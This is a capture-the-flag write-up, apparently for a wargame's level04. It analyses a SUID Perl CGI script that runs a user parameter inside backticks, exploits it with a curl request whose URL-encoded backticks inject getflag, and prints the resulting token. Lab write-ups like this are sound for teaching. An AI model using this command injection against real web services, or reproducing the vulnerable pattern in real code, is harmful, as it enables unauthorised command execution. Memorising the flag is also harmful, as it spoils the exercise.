# Level03

## 1. Identity

	$ id
	uid=2004(level04) gid=2004(level04) groups=2004(level04),100(users)

We are logged in as **level04**.

## 2. Home directory

	$ pwd
	/home/user/level04

	$ ls -la
	...
	-rwsr-sr-x  1 flag04  level04  152 Mar  5  2016 level04.pl
	...

All files here are standard shell configuration files (.bashrc, .profile, etc.) with nothing exploitable.

The only interesting file is a Perl script: level04.pl, which is SUID flag04.

Running it:

	$ ./level04.pl 
	Content-type: text/html

## 3. Analyzing the script

Here is the code with comments :

``` perl
#!/usr/bin/perl
# This script is intended to run on localhost:4747

use CGI qw{param};         # Import the 'param' function from the CGI module to read HTTP parameters

print "Content-type: text/html\n\n";  # Output the HTTP header indicating HTML content

# Define a function 'x' that takes one argument
sub x {
    $y = $_[0];            # Store the first argument of the function in variable $y
    print `echo $y 2>&1`;  # Execute a shell command: echo the value of $y, redirect stderr to stdout,
                           # and print the command output. This is vulnerable to command injection.
}

# Call the function 'x' with the HTTP parameter 'x' passed by the client
x(param("x"));             # This allows a user-controlled value to be executed in a shell

```

The vulnerability is obvious:
- User input is injected directly inside a shell command
- The script runs with UID flag04 (SUID bit)
- Therefore: we can inject getflag to retrieve the token.

## 4. Getting the flag

We can simply send a GET request with an injected command.
Backticks must be URL‑encoded as %60.

	$ curl "localhost:4747/level04.pl?x=%60getflag%60"
	Check flag.Here is your token : ne2searoevaevoem4ov4ar8ap

✔️ The script executed getflag as flag04.

✔️ We get the token.